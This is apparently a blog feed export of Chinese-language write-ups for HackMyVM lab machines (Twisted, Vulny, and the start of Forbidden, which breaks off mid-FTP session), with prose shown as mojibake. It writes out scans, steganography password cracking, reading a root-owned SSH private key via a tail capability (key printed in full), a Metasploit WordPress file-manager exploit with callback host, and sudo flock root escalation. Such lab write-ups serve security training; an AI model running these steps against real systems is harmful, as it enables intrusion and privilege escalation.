<br>çœ‹ä¸‹ç½‘ç«™<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/11.Twisted.001.png" referrerpolicy="no-referrer"><br>æŠŠä¸¤å¼ å›¾ç‰‡ä¿å­˜åˆ°æœ¬åœ°<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# gobuster dir -u http://192.168.9.13/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x jpg,php,html,png,zip,txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.9.13/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              jpg,php,html,png,zip,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 1453501 / 1453508 (100.00%)
===============================================================
Finished
===============================================================
<br>å•¥éƒ½æ²¡æœ‰<br><br>miscåšçš„å°‘ï¼Œè¯•äº†å¥½å‡ ç§æ–¹å¼æ²¡è§£å‡ºæ¥ã€‚çœ‹äº†ä¸‹wpç”¨ <a data-tooltip-position="top" aria-label="../../26-å·¥å…·ä½¿ç”¨/StegSeekä½¿ç”¨" data-href="../../26-å·¥å…·ä½¿ç”¨/StegSeekä½¿ç”¨" href="https://www.c1trus.top/26-å·¥å…·ä½¿ç”¨/stegseekä½¿ç”¨.html" class="internal-link" target="_self" rel="noopener nofollow">stegseek</a>çˆ†ç ´<br>
<br>stegseek --seed cat-hidden.jpg æ£€æµ‹æ˜¯å¦ä½¿ç”¨steghideè¿›è¡Œç¼–ç 
<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Twisted]
â””â”€# stegseek --seed cat-hidden.jpg 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found (possible) seed: "841e4403"            
        Plain size: 47.0 Byte(s) (compressed)
        Encryption Algorithm: rijndael-128
        Encryption Mode:      cbc
<br>
<br>stegseek --crack çˆ†ç ´è§£å¯†
<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Twisted]
â””â”€# stegseek --crack cat-hidden.jpg  /usr/share/wordlists/rockyou.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "sexymama"
[i] Original filename: "mateo.txt".
[i] Extracting to "cat-hidden.jpg.out".

                                                                                              
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Twisted]
â””â”€# stegseek --crack cat-original.jpg  /usr/share/wordlists/rockyou.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "westlife"
[i] Original filename: "markus.txt".
[i] Extracting to "cat-original.jpg.out".

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Twisted]
â””â”€# cat cat-hidden.jpg.out 
thisismypassword
                                                                                              
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Twisted]
â””â”€# cat cat-original.jpg.out 
markuslovesbonita
<br>æ„æ€æ˜¯markuslovesbonita æ˜¯ä»–çš„å¯†ç ï¼Ÿ<br>åŸå§‹æ–‡ä»¶åå¯èƒ½æ˜¯ç”¨æˆ·å markus  mateo<br>ç»è¿‡æµ‹è¯•è·å–åˆ°ä¸¤ä¸ªç”¨æˆ·ä¸å¯¹åº”çš„è´¦æˆ·å¯†ç <br>markus   markuslovesbonita 
mateo    thisismypassword
<br>sshç«¯å£å°±æ˜¯2222<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/11.Twisted.002.png" referrerpolicy="no-referrer"><br><br>markus@twisted:~$ find / -perm -4000 2&gt;/dev/null
/home/bonita/beroot
/usr/bin/su
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
markus@twisted:~$ sudo -l
-bash: sudo: command not found
markus@twisted:~$ cd /home/bonita/
markus@twisted:/home/bonita$ ./beroot
-bash: ./beroot: Permission denied
<br>çœ‹æ¥æ˜¯éœ€è¦æˆ‘ä»¬å…ˆæ•´åˆ°bonitaç”¨æˆ·<br>çœ‹ä¸‹ç»™markusæˆ‘ä»¬çš„æç¤º<br>markus@twisted:~$ cat note.txt 
Hi bonita,
I have saved your id\_rsa here: /var/cache/apt/id\_rsa
<br>å‘Šè¯‰æˆ‘ä»¬è¿™é‡Œå­˜åœ¨Bonistaç”¨æˆ·çš„ç§é’¥<br>markus@twisted:/var/cache/apt$ ls -l
total 62172
drwxr-xr-x 3 root root    12288 Oct 14  2020 archives
-rw------- 1 root root     1823 Oct 14  2020 id\_rsa
-rw-r--r-- 1 root root 31831069 Oct 14  2020 pkgcache.bin
-rw-r--r-- 1 root root 31810419 Oct 14  2020 srcpkgcache.bin
<br>ä½†æˆ‘ä»¬æ²¡æœ‰æƒé™è¯»å–è¿™ä¸ªç§é’¥<br>mateoçš„æç¤º<br>mateo@twisted:~$ cat note.txt 
/var/www/html/gogogo.wav
<br>å¬ä¸€ä¸‹è¿™ä¸ªéŸ³é¢‘æ„Ÿè§‰åƒæ˜¯æ‘©æ–¯ç”µç <br>è§£å¯†<a rel="noopener nofollow" class="external-link" href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html" target="_blank">https://morsecode.world/international/decoder/audio-decoder-adaptive.html</a><br>G O D E E P E R . . . C O M E W I T H M E . . . L I T T L E R A B B I T . . .<br>å¥½åƒæ²¡æœ‰ä»€ä¹ˆæ„ä¹‰<br>å¸¸è§çš„ææƒSUID ä¸ SUDO éƒ½çœ‹äº† <br>çœ‹ä¸€ä¸‹Capability<br>mateo@twisted:/var/www/html$ /sbin/getcap -r / 2&gt;/dev/null
/usr/bin/ping = cap\_net\_raw+ep
/usr/bin/tail = cap\_dac\_read\_search+ep
<br>ç”¨tailè¯»å–ç§é’¥<br>tail -c1G "/var/cache/apt/id\_rsa"
<br>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA8NIseqX1B1YSHTz1A4rFWhjIJffs5vSbAG0Vg2iTa+xshyrmk6zd
FyguFUO7tN2TCJGTomDTXrG/KvWaucGvIAXpgV1lQsQkBV/VNrVC1Ioj/Fx3hUaSCC4PBS
olvmldJg2habNOUGA4EBKlTwfDi+vjDP8d77mF+rvA3EwR3vj37AiXFk5hBEsqr9cWeTr1
vD5282SncYtJb/Zx0eOa6VVFqDfOB7LKZA2QYIbfR7jezOdX+/nlDKX8Xp07wimFuMJpcF
gFnch7ptoxAqe0M0UIEzP+G2ull3m80G5L7Q/3acg14ULnNVs5dTJWPO2Fp7J2qKW+4A5C
tt0G5sIBpQAAA8hHx4cBR8eHAQAAAAdzc2gtcnNhAAABAQDw0ix6pfUHVhIdPPUDisVaGM
gl9+zm9JsAbRWDaJNr7GyHKuaTrN0XKC4VQ7u03ZMIkZOiYNNesb8q9Zq5wa8gBemBXWVC
xCQFX9U2tULUiiP8XHeFRpIILg8FKiW+aV0mDaFps05QYDgQEqVPB8OL6+MM/x3vuYX6u8
DcTBHe+PfsCJcWTmEESyqv1xZ5OvW8PnbzZKdxi0lv9nHR45rpVUWoN84HsspkDZBght9H
uN7M51f7+eUMpfxenTvCKYW4wmlwWAWdyHum2jECp7QzRQgTM/4ba6WXebzQbkvtD/dpyD
XhQuc1Wzl1MlY87YWnsnaopb7gDkK23QbmwgGlAAAAAwEAAQAAAQAuUW5GpLbNE2vmfbvu
U3mDy7JrQxUokrFhUpnJrYp1PoLdOI4ipyPa+VprspxevCM0ibNojtD4rJ1FKPn6cls5gI
mZ3RnFzq3S7sy2egSBlpQ3TJ2cX6dktV8kMigSSHenAwYhq2ALq4X86WksGyUsO1FvRX4/
hmJTiFsew+7IAKE+oQHMzpjMGyoiPXfdaI3sa10L2WfkKs4I4K/v/x2pW78HIktaQPutro
nxD8/fwGxQnseC69E6vdh/5tS8+lDEfYDz4oEy9AP26Hdtho0D6E9VT9T//2vynHLbmSXK
mPbr04h5i9C3h81rh4sAHs9nVAEe3dmZtmZxoZPOJKRhAAAAgFD+g8BhMCovIBrPZlHCu+
bUlbizp9qfXEc8BYZD3frLbVfwuL6dafDVnj7EqpabmrTLFunQG+9/PI6bN+iwloDlugtq
yzvf924Kkhdk+N366FLDt06p2tkcmRljm9kKMS3lBPMu9C4+fgo9LCyphiXrm7UbJHDVSP
UvPg4Fg/nqAAAAgQD9Q83ZcqDIx5c51fdYsMUCByLby7OiIfXukMoYPWCE2yRqa53PgXjh
V2URHPPhqFEa+iB138cSgCU3RxbRK7Qm1S7/P44fnWCaNu920iLed5z2fzvbTytE/h9QpJ
LlecEv2Hx03xyRZBsHFkMf+dMDC0ueU692Gl7YxRw+Lic0PQAAAIEA82v3Ytb97SghV7rz
a0S5t7v8pSSYZAW0OJ3DJqaLtEvxhhomduhF71T0iw0wy8rSH7j2M5PGCtCZUa2/OqQgKF
eERnqQPQSgM0PrATtihXYCTGbWo69NUMcALah0gT5i6nvR1Jr4220InGZEUWHLfvkGTitu
D0POe+rjV4B7EYkAAAAOYm9uaXRhQHR3aXN0ZWQBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
<br>åˆ©ç”¨ç§é’¥åˆ‡æ¢åˆ°bonitaç”¨æˆ·<br>ssh -i id\_rsa bonita@192.168.9.13 -p 2222
bonita@twisted:~$ cat user.txt 
HMVblackcat
<br><br>æ‰§è¡Œbonitaç›®å½•ä¸‹çš„beroot<br>æç¤ºæˆ‘ä»¬éœ€è¦å¯†ç <br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/11.Twisted.003.png" referrerpolicy="no-referrer"><br>æƒ³åˆ°æœ€å¼€å§‹åˆ©ç”¨<a data-tooltip-position="top" aria-label="../../26-å·¥å…·ä½¿ç”¨/StegSeekä½¿ç”¨" data-href="../../26-å·¥å…·ä½¿ç”¨/StegSeekä½¿ç”¨" href="https://www.c1trus.top/26-å·¥å…·ä½¿ç”¨/stegseekä½¿ç”¨.html" class="internal-link" target="_self" rel="noopener nofollow">stegseek</a>æ—¶è¿˜æœ‰ä¸¤ä¸ªæ²¡æœ‰ç”¨ä¸Š<br>sexymama<br>westlife<br>è¯•äº†ä¸€ä¸‹éƒ½æ˜¯é”™çš„<br>é€†å‘ä¸€ä¸‹è¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶çœ‹çœ‹<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/11.Twisted.004.png" referrerpolicy="no-referrer"><br>codeåº”è¯¥å°±æ˜¯5880<br>æˆåŠŸææƒroot<br>bonita@twisted:~$ ./beroot
Enter the code:
 5880
 root@twisted:~# 
]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/11.twisted.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/11.Twisted.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/11.Twisted.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/11.Twisted.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[12.Vulny]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>
<br><a data-tooltip-position="top" aria-label="3. ç”¨msfæ¢­å“ˆ" data-href="#3. ç”¨msfæ¢­å“ˆ" href="https://www.c1trus.top/about:blank#3._ç”¨msfæ¢­å“ˆ" class="internal-link" target="_self" rel="noopener nofollow">3. ç”¨msfæ¢­å“ˆ</a>
<br><a data-tooltip-position="top" aria-label="4. ææƒroot" data-href="#4. ææƒroot" href="https://www.c1trus.top/about:blank#4._ææƒroot" class="internal-link" target="_self" rel="noopener nofollow">4. ææƒroot</a>
<br>é¶æœºé“¾æ¥ï¼šhttps://hackmyvm.eu/machines/machine.php?vm=Vulny
<br>ä½œè€…ï¼šsml
<br>éš¾åº¦ï¼šâ­ï¸â­ï¸
<br>çŸ¥è¯†ç‚¹ï¼šwp_file_manager_rceã€sudoææƒï¼ˆflockï¼‰
<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# nmap -sS 192.168.9.14 -p 1-65535 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-06 18:57 CST
Nmap scan report for 192.168.9.14
Host is up (0.00033s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
33060/tcp open  mysqlx
MAC Address: 08:00:27:74:86:89 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 8.18 seconds
<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Vulny]
â””â”€# gobuster dir -u http://192.168.9.14 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x jpg,php,html,png,zip,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.9.14
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip,txt,jpg,php,html,png
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 10918]
/javascript           (Status: 301) [Size: 317] [--&gt; http://192.168.9.14/javascript/]
/secret               (Status: 301) [Size: 313] [--&gt; http://192.168.9.14/secret/]
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
Progress: 1453501 / 1453508 (100.00%)
===============================================================
Finished
===============================================================
<br>é¦–é¡µ<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/12.Vulny.001.png" referrerpolicy="no-referrer"><br>/secret <br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/12.Vulny.002.png" referrerpolicy="no-referrer"><br>/javascript<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/12.Vulny.003.png" referrerpolicy="no-referrer"><br>wordpressæŠ¥é”™äº†ã€‚è¯´æ‰¾ä¸åˆ°config-168.9.14.phpæ–‡ä»¶ï¼Œè™½ç„¶ä¿å­˜äº†ä½†æ˜¯æˆ‘ä»¬ä¹Ÿå¾—åˆ°äº†è¿™ä¸ªæ–‡ä»¶å¤¹åº”è¯¥æ˜¯å±äºwordpressçš„<br>å¯¹/screctç›®å½•è¿›è¡Œæ‰«æ<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Vulny]
â””â”€# dirsearch -u http://192.168.9.14/secret
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg\_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg\_resources.html
  from pkg\_resources import DistributionNotFound, VersionConflict

  \_|. \_ \_  \_  \_  \_ \_|\_    v0.4.3
 (\_||| \_) (/\_(\_|| (\_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/hmv/Vulny/reports/http\_192.168.9.14/\_secret\_24-11-06\_19-07-03.txt

Target: http://192.168.9.14/

[19:07:03] Starting: secret/
[19:07:04] 403 -  277B  - /secret/.ht\_wsr.txt
[19:07:04] 403 -  277B  - /secret/.htaccess.bak1
[19:07:04] 403 -  277B  - /secret/.htaccess.orig
[19:07:04] 403 -  277B  - /secret/.htaccess.sample
[19:07:04] 403 -  277B  - /secret/.htaccess\_extra
[19:07:04] 403 -  277B  - /secret/.htaccess.save
[19:07:04] 403 -  277B  - /secret/.htaccess\_orig
[19:07:04] 403 -  277B  - /secret/.htaccessBAK
[19:07:04] 403 -  277B  - /secret/.htaccessOLD
[19:07:04] 403 -  277B  - /secret/.htaccess\_sc
[19:07:04] 403 -  277B  - /secret/.htaccessOLD2
[19:07:04] 403 -  277B  - /secret/.html
[19:07:04] 403 -  277B  - /secret/.htm
[19:07:04] 403 -  277B  - /secret/.htpasswd\_test
[19:07:04] 403 -  277B  - /secret/.htpasswds
[19:07:04] 403 -  277B  - /secret/.httr-oauth
[19:07:04] 403 -  277B  - /secret/.php
[19:07:20] 200 -    3KB - /secret/readme.html
[19:07:26] 301 -  322B  - /secret/wp-admin  -&gt;  http://192.168.9.14/secret/wp-admin/
[19:07:26] 301 -  324B  - /secret/wp-content  -&gt;  http://192.168.9.14/secret/wp-content/
[19:07:26] 200 -  511B  - /secret/wp-content/
[19:07:26] 500 -  610B  - /secret/wp-content/plugins/akismet/admin.php
[19:07:26] 500 -  610B  - /secret/wp-content/plugins/akismet/akismet.php
[19:07:26] 200 -  469B  - /secret/wp-content/upgrade/
[19:07:26] 200 -  486B  - /secret/wp-content/uploads/
[19:07:26] 403 -  277B  - /secret/wp-includes/
[19:07:26] 301 -  325B  - /secret/wp-includes  -&gt;  http://192.168.9.14/secret/wp-includes/
[19:07:26] 500 -    0B  - /secret/wp-includes/rss-functions.php
[19:07:26] 500 -    3KB - /secret/wp-admin/setup-config.php
<br>/secret/readme.html<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/12.Vulny.004.png" referrerpolicy="no-referrer"><br>/secret/wp-content/<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/12.Vulny.005.png" referrerpolicy="no-referrer"><br>/secret/wp-content/uploads/<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/12.Vulny.006.png" referrerpolicy="no-referrer"><br>è¿™é‡Œçœ‹èµ·æ¥åº”è¯¥æ˜¯æœ‰ä¸€ä¸ªæ–‡ä»¶ç›®å½•æ³„éœ²<br>åœ¨<a rel="noopener nofollow" class="external-link" href="http://192.168.9.14/secret/wp-content/uploads/2020/10/wp-file-manager-6.O.zip" target="_blank">http://192.168.9.14/secret/wp-content/uploads/2020/10/wp-file-manager-6.O.zip</a><br>å‘ç°äº†wordpressçš„æ’ä»¶åŒ…<br>çœ‹ä¸‹é‡Œé¢çš„readme.txt è·å–åˆ°äº†ç‰ˆæœ¬ 6.0<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/12.Vulny.007.png" referrerpolicy="no-referrer"><br>ç½‘ä¸Šæœç´¢ä¸€ä¸‹ç›¸å…³çš„æ¼æ´<a rel="noopener nofollow" class="external-link" href="https://www.cnblogs.com/FallenStar/articles/17354363.html" target="_blank">https://www.cnblogs.com/FallenStar/articles/17354363.html</a><br><br>msfconsole
search wp-file-manager
use exploit/multi/http/wp\_file\_manager\_rce
set targeturi /secret/
set rhost 192.168.9.14
set rport 80
set lhost 192.168.9.3
set lport 1199
set forceexploit true
run
shell
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/12.Vulny.008.png" referrerpolicy="no-referrer"><br>æ•°æ®åº“ä¿¡æ¯è·å–<br>å…ˆæŠŠwordpressç»™ä»–downloadä¸‹æ¥<br>shellå†…ï¼š
cd /usr/share/wordpress
tar -czvf wordpress.tar.gz \*
exit y //é€€å‡ºshell
download /usr/share/wordpress/wordpress.tar.gz /home/kali/hmv/Vulny/wordpress.tar.gz
<br>ç«¯å£æ‰«ææ—¶å‘ç°å¼€æ”¾äº†33060ç«¯å£ å¯¹åº”çš„æœåŠ¡æ—¶Mysqlx<br>çœ‹ä¸‹é…ç½®æ–‡ä»¶<br>cat /usr/share/wordpress/wp-config.php
<br>&lt;?php
*/\*\*\
 *\* WordPress's Debianised default master config file*
 *\* Please do NOT edit and learn how the configuration works in*
 *\* /usr/share/doc/wordpress/README.Debian*
 *\*\*\*/*

*/\* Look up a host-specific config file in*
 *\* /etc/wordpress/config-&lt;host&gt;.php or /etc/wordpress/config-&lt;domain&gt;.php*
 *\*/*
$debian\_server = preg\_replace('/:.\*/', "", $\_SERVER['HTTP\_HOST']);
$debian\_server = preg\_replace("/[^a-zA-Z0-9.\-]/", "", $debian\_server);
$debian\_file = '/etc/wordpress/config-'.strtolower($debian\_server).'.php';
*/\* Main site in case of multisite with subdomains \*/*
$debian\_main\_server = preg\_replace("/^[^.]\*\./", "", $debian\_server);
$debian\_main\_file = '/etc/wordpress/config-'.strtolower($debian\_main\_server).'.php';

if (file\_exists($debian\_file)) {
    require\_once($debian\_file);
    define('DEBIAN\_FILE', $debian\_file);
} elseif (file\_exists($debian\_main\_file)) {
    require\_once($debian\_main\_file);
    define('DEBIAN\_FILE', $debian\_main\_file);
} elseif (file\_exists("/etc/wordpress/config-default.php")) {
    require\_once("/etc/wordpress/config-default.php");
    define('DEBIAN\_FILE', "/etc/wordpress/config-default.php");
} else {
    header("HTTP/1.0 404 Not Found");
    echo "Neither &lt;b&gt;$debian\_file&lt;/b&gt; nor &lt;b&gt;$debian\_main\_file&lt;/b&gt; could be found. &lt;br/&gt; Ensure one of them exists, is readable by the webserver and contains the right password/username.";
    exit(1);
}

*/\* idrinksomewater \*/*

*/\* Default value for some constants if they have not yet been set*
   *by the host-specific config files \*/*
if (!defined('ABSPATH'))
    define('ABSPATH', '/usr/share/wordpress/');
if (!defined('WP\_CORE\_UPDATE'))
    define('WP\_CORE\_UPDATE', false);
if (!defined('WP\_ALLOW\_MULTISITE'))
    define('WP\_ALLOW\_MULTISITE', true);
if (!defined('DB\_NAME'))
    define('DB\_NAME', 'wordpress');
if (!defined('DB\_USER'))
    define('DB\_USER', 'wordpress');
if (!defined('DB\_HOST'))
    define('DB\_HOST', 'localhost');
if (!defined('WP\_CONTENT\_DIR') &amp;&amp; !defined('DONT\_SET\_WP\_CONTENT\_DIR'))
    define('WP\_CONTENT\_DIR', '/var/lib/wordpress/wp-content');

*/\* Default value for the table\_prefix variable so that it doesn't need to*
   *be put in every host-specific config file \*/*
if (!isset($table\_prefix)) {
    $table\_prefix = 'wp\_';
}

if (isset($\_SERVER['HTTP\_X\_FORWARDED\_PROTO']) &amp;&amp; $\_SERVER['HTTP\_X\_FORWARDED\_PROTO'] == 'https')
    $\_SERVER['HTTPS'] = 'on';

require\_once(ABSPATH . 'wp-settings.php');
?&gt;
<br>æ‰¾ä¸åˆ°æ•°æ®åº“å¯†ç å•Šï¼Œè”æƒ³åˆ°é¦–é¡µæç¤ºç¼ºå°‘æŸä¸ªæ–‡ä»¶çŒœæµ‹å°±æ˜¯è¿™ä¸ªæ–‡ä»¶<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/12.Vulny.009.png" referrerpolicy="no-referrer"><br>æœç„¶åœ¨è¿™é‡Œ<br>cd /etc/wordpress
ls
config-192.168.1.122.php
htaccess
cat con\*
&lt;?php
define('DB\_NAME', 'wordpress');
define('DB\_USER', 'wordpress');
define('DB\_PASSWORD', 'myfuckingpassword');
define('DB\_HOST', 'localhost');
define('DB\_COLLATE', 'utf8\_general\_ci');
define('WP\_CONTENT\_DIR', '/usr/share/wordpress/wp-content');
?&gt;
<br>åˆ©ç”¨navicatè¿æ¥ä¸Šå»<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/12.Vulny.010.png" referrerpolicy="no-referrer"><br>æ— æ³•è¿æ¥ã€‚<br>ä¸Šé¢wp-config.phpé‡Œé¢æœ‰ä¸€ä¸ªå¾ˆå¥‡æ€ªçš„æ³¨é‡Š<br>*/\* idrinksomewater \*/*
<br>æœ‰å¯èƒ½æ˜¯ç”¨æˆ·å¯†ç <br>ææƒåˆ°adrianç”¨æˆ·<br>su adrian
<br><br>sudo -l
Matching Defaults entries for adrian on vulny:
    env\_reset, mail\_badpass, secure\_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User adrian may run the following commands on vulny:
    (ALL : ALL) NOPASSWD: /usr/bin/flock
sudo flock -u / /bin/sh
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/12.vulny.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/12.Vulny.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/12.Vulny.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/12.Vulny.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[10.Forbidden]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>
<br><a data-tooltip-position="top" aria-label="3. ç›®å½•æ‰«æ" data-href="#3. ç›®å½•æ‰«æ" href="https://www.c1trus.top/about:blank#3._ç›®å½•æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">3. ç›®å½•æ‰«æ</a>
<br><a data-tooltip-position="top" aria-label="4. ææƒ" data-href="#4. ææƒ" href="https://www.c1trus.top/about:blank#4._ææƒ" class="internal-link" target="_self" rel="noopener nofollow">4. ææƒ</a>
<br><a data-tooltip-position="top" aria-label="5. å†æ¬¡ææƒ" data-href="#5. å†æ¬¡ææƒ" href="https://www.c1trus.top/about:blank#5._å†æ¬¡ææƒ" class="internal-link" target="_self" rel="noopener nofollow">5. å†æ¬¡ææƒ</a>
<br><a data-tooltip-position="top" aria-label="6. peterææƒroot" data-href="#6. peterææƒroot" href="https://www.c1trus.top/about:blank#6._peterææƒroot" class="internal-link" target="_self" rel="noopener nofollow">6. peterææƒroot</a>
<br><a data-tooltip-position="top" aria-label="7. æ‹“å±•" data-href="#7. æ‹“å±•" href="https://www.c1trus.top/about:blank#7._æ‹“å±•" class="internal-link" target="_self" rel="noopener nofollow">7. æ‹“å±•</a>
<br>é¶æœºé“¾æ¥ï¼šhttps://hackmyvm.eu/machines/machine.php?vm=Forbidden
<br>ä½œè€…ï¼šsml
<br>éš¾åº¦ï¼šâ­ï¸â­ï¸
<br>çŸ¥è¯†ç‚¹ï¼šSUDOææƒï¼ˆjoinã€setarchï¼‰ã€hashçˆ†ç ´
<br><br>ç«¯å£æ‰«æ<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# nmap -sS 192.168.9.12 -p 1-65535 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-06 12:38 CST
Nmap scan report for 192.168.9.12
Host is up (0.000056s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
MAC Address: 08:00:27:2E:11:DB (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 8.76 seconds
<br>å…ˆçœ‹ç½‘ç«™<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/10.Forbidden.001.png" referrerpolicy="no-referrer"><br>æ„æ€æ˜¯è¯´Phpè¢«ç¦ç”¨äº†ã€‚ä¸è®©ç”¨php<br>ä¸”ç»™æˆ‘ä»¬è¯´äº†ç®¡ç†å‘˜ç”¨æˆ·çš„åå­— marta<br>ftpç™»å½•<br>ftpå°è¯•åŒ¿åç™»å½•å‘ç°éœ€è¦ç»™å‡ºå¯†ç <br>æˆ‘çŒœæµ‹å°±æ˜¯ç®¡ç†å‘˜çš„åå­— Marta<br>æˆåŠŸç™»å½•<br>ftp 192.168.9.12        
Connected to 192.168.9.12.
220 (vsFTPd 3.0.3)
Name (192.168.9.12:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls
229 Entering Extended Passive Mode (|||5154|)
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Oct 09  2020 www
<br>æŸ¥çœ‹wwwç›®å½•<br>ftp&gt; ls
229 Entering Extended Passive Mode (|||21476|)
150 Here comes the directory listing.
